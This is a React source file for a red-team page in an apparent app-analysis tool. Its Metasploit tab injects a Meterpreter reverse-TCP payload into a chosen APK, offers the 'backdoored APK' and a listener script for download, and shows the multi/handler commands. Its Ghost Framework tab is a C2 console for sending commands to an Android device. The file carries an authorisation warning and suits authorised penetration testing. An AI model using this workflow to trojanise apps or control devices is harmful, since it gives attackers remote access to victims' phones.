import { useState } from 'react'
import { useQuery, useMutation } from '@tanstack/react-query'
import { Sword, Download, FileDown, Loader2, Terminal, Send, Trash2, WifiOff } from 'lucide-react'
import { clsx } from 'clsx'
import { redTeamApi, type InjectResult } from '@/api/redTeam'
import { analysisApi } from '@/api/analysis'

type PageTab = 'metasploit' | 'ghost'

export default function RedTeamPage() {
  const [pageTab, setPageTab] = useState<PageTab>('metasploit')

  return (
    <div className="flex flex-col h-full">
      <div className="flex border-b border-bg-border bg-bg-surface shrink-0">
        {([
          { id: 'metasploit', label: 'Metasploit', color: 'text-red-400 border-red-400' },
          { id: 'ghost', label: 'Ghost Framework', color: 'text-purple-400 border-purple-400' },
        ] as const).map(({ id, label, color }) => (
          <button
            key={id}
            onClick={() => setPageTab(id)}
            className={clsx(
              'flex items-center gap-1.5 px-4 py-2.5 text-xs font-medium border-b-2 transition-colors',
              pageTab === id ? color : 'border-transparent text-zinc-500 hover:text-zinc-300'
            )}
          >
            <Sword size={12} /> {label}
          </button>
        ))}
      </div>

      {pageTab === 'metasploit' && <MetasploitTab />}
      {pageTab === 'ghost' && <GhostTab />}
    </div>
  )
}

// ── Metasploit Tab ────────────────────────────────────────────────────────────

export function MetasploitTab() {
  const [analysisId, setAnalysisId] = useState<number | ''>('')
  const [lhost, setLhost] = useState('')
  const [lport, setLport] = useState('4444')
  const [payload, setPayload] = useState('android/meterpreter/reverse_tcp')
  const [result, setResult] = useState<InjectResult | null>(null)

  const { data: analyses = [] } = useQuery({
    queryKey: ['analyses'],
    queryFn: analysisApi.list,
  })

  const { data: payloadsData } = useQuery({
    queryKey: ['red-team-payloads'],
    queryFn: redTeamApi.payloads,
  })

  const inject = useMutation({
    mutationFn: () => redTeamApi.inject({
      analysis_id: Number(analysisId),
      lhost,
      lport: Number(lport),
      payload,
    }),
    onSuccess: (data) => setResult(data),
  })

  return (
    <div className="flex-1 overflow-auto p-6">
      <div className="max-w-xl space-y-5">
        <div>
          <h2 className="text-sm font-semibold text-zinc-200 mb-1">Payload Injection</h2>
          <p className="text-xs text-zinc-500">
            Injects a Meterpreter payload into an existing APK using msfvenom. The backdoored APK can then
            be installed on a target device. Use only on apps you own or have explicit written authorization to test.
          </p>
        </div>

        <div className="space-y-3">
          {/* APK selector */}
          <div>
            <label className="block text-xs text-zinc-400 mb-1">Source APK (from analysis)</label>
            <select
              value={analysisId}
              onChange={(e) => setAnalysisId(e.target.value ? Number(e.target.value) : '')}
              className="w-full bg-bg-elevated border border-bg-border rounded px-2 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-accent"
            >
              <option value="">Select an analysis…</option>
              {analyses.filter((a: any) => a.platform !== 'ios').map((a: any) => (
                <option key={a.id} value={a.id}>{a.apk_filename}</option>
              ))}
            </select>
          </div>

          {/* Payload */}
          <div>
            <label className="block text-xs text-zinc-400 mb-1">Payload</label>
            <select
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              className="w-full bg-bg-elevated border border-bg-border rounded px-2 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-accent"
            >
              {(payloadsData?.payloads ?? ['android/meterpreter/reverse_tcp']).map((p) => (
                <option key={p} value={p}>{p}</option>
              ))}
            </select>
          </div>

          {/* LHOST / LPORT */}
          <div className="grid grid-cols-3 gap-3">
            <div className="col-span-2">
              <label className="block text-xs text-zinc-400 mb-1">LHOST (attacker IP)</label>
              <input
                type="text"
                placeholder="192.168.1.100"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                className="w-full bg-bg-elevated border border-bg-border rounded px-2 py-1.5 text-xs text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-accent"
              />
            </div>
            <div>
              <label className="block text-xs text-zinc-400 mb-1">LPORT</label>
              <input
                type="number"
                value={lport}
                onChange={(e) => setLport(e.target.value)}
                className="w-full bg-bg-elevated border border-bg-border rounded px-2 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-accent"
              />
            </div>
          </div>

          {inject.error && (
            <p className="text-xs text-red-400">{(inject.error as Error).message}</p>
          )}

          <button
            onClick={() => inject.mutate()}
            disabled={inject.isPending || !analysisId || !lhost}
            className="flex items-center gap-2 px-4 py-2 rounded bg-red-600/80 hover:bg-red-600 text-white text-xs font-medium disabled:opacity-40 transition-colors"
          >
            {inject.isPending ? <Loader2 size={13} className="animate-spin" /> : <Sword size={13} />}
            {inject.isPending ? 'Injecting payload…' : 'Inject Payload'}
          </button>
        </div>

        {/* Result */}
        {result && (
          <div className="p-4 rounded-lg bg-bg-surface border border-red-500/30 space-y-3">
            <p className="text-xs font-semibold text-red-400">Payload injected — {result.filename}</p>
            <div className="flex gap-2">
              <a
                href={result.download_url}
                download={result.filename}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded bg-bg-elevated border border-bg-border text-xs text-zinc-200 hover:border-zinc-500 transition-colors"
              >
                <Download size={12} /> Download backdoored APK
              </a>
              <a
                href={result.listener_rc_url}
                download={`listener_${result.job_id}.rc`}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded bg-bg-elevated border border-bg-border text-xs text-zinc-200 hover:border-zinc-500 transition-colors"
              >
                <FileDown size={12} /> Listener .rc script
              </a>
            </div>
            <div className="text-xs text-zinc-500 font-mono bg-bg-elevated rounded p-2 space-y-0.5">
              <p>msfconsole -r listener_{result.job_id}.rc</p>
              <p className="text-zinc-600"># or manually: use exploit/multi/handler → set PAYLOAD {result.payload} → set LHOST {result.lhost} → set LPORT {result.lport} → run</p>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

// ── Ghost Framework Tab ───────────────────────────────────────────────────────

export function GhostTab() {
  const [deviceId, setDeviceId] = useState('')
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [lines, setLines] = useState<string[]>([])
  const [cmd, setCmd] = useState('')
  const [connecting, setConnecting] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const outputRef = useState<HTMLDivElement | null>(null)

  const connect = async () => {
    if (!deviceId.trim()) return
    setConnecting(true)
    setError(null)
    try {
      const sess = await redTeamApi.ghostConnect(deviceId.trim())
      setSessionId(sess.session_id)
      pollOutput(sess.session_id)
    } catch (e: any) {
      setError(e.message)
    } finally {
      setConnecting(false)
    }
  }

  const pollOutput = async (sid: string) => {
    const interval = setInterval(async () => {
      try {
        const data = await redTeamApi.ghostOutput(sid)
        setLines(data.lines)
      } catch {
        clearInterval(interval)
      }
    }, 1000)
  }

  const sendCmd = async () => {
    if (!sessionId || !cmd.trim()) return
    await redTeamApi.ghostCommand(sessionId, cmd.trim())
    setCmd('')
  }

  const disconnect = async () => {
    if (sessionId) await redTeamApi.ghostDisconnect(sessionId)
    setSessionId(null)
    setLines([])
  }

  return (
    <div className="flex-1 overflow-auto p-6">
      <div className="max-w-2xl space-y-4">
        <div>
          <h2 className="text-sm font-semibold text-zinc-200 mb-1">Ghost Framework C2</h2>
          <p className="text-xs text-zinc-500">
            Android C2 via Ghost Framework. Requires <span className="font-mono">pip3 install ghost-framework</span> and
            a rooted Android device connected via ADB.
          </p>
        </div>

        {!sessionId ? (
          <div className="flex items-center gap-2">
            <input
              type="text"
              placeholder="Device serial or IP:port (e.g. emulator-5554)"
              value={deviceId}
              onChange={(e) => setDeviceId(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && connect()}
              className="flex-1 bg-bg-elevated border border-bg-border rounded px-2 py-1.5 text-xs text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-purple-500"
            />
            <button
              onClick={connect}
              disabled={connecting || !deviceId.trim()}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded bg-purple-600/80 hover:bg-purple-600 text-white text-xs font-medium disabled:opacity-40 transition-colors"
            >
              {connecting ? <Loader2 size={12} className="animate-spin" /> : <Terminal size={12} />}
              {connecting ? 'Connecting…' : 'Connect'}
            </button>
          </div>
        ) : (
          <div className="flex items-center gap-2 text-xs">
            <span className="text-purple-400 font-mono">● session {sessionId}</span>
            <span className="text-zinc-600">·</span>
            <span className="text-zinc-400">{deviceId}</span>
            <button onClick={disconnect} className="ml-auto flex items-center gap-1 text-zinc-500 hover:text-red-400 transition-colors">
              <WifiOff size={11} /> Disconnect
            </button>
          </div>
        )}

        {error && <p className="text-xs text-red-400">{error}</p>}

        {sessionId && (
          <>
            <div className="bg-bg-base rounded-lg border border-bg-border h-64 overflow-auto p-3 font-mono text-xs text-green-400 space-y-0.5">
              {lines.length === 0 && <span className="text-zinc-600">Waiting for output…</span>}
              {lines.map((l, i) => <div key={i}>{l}</div>)}
            </div>
            <div className="flex items-center gap-2">
              <input
                type="text"
                placeholder="ghost command…"
                value={cmd}
                onChange={(e) => setCmd(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && sendCmd()}
                className="flex-1 bg-bg-elevated border border-bg-border rounded px-2 py-1.5 text-xs text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-purple-500 font-mono"
              />
              <button
                onClick={sendCmd}
                disabled={!cmd.trim()}
                className="flex items-center gap-1 px-3 py-1.5 rounded bg-purple-600/60 hover:bg-purple-600 text-white text-xs disabled:opacity-40 transition-colors"
              >
                <Send size={11} /> Send
              </button>
              <button onClick={() => setLines([])} title="Clear output" className="p-1.5 text-zinc-500 hover:text-zinc-200 rounded hover:bg-bg-elevated">
                <Trash2 size={13} />
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  )
}
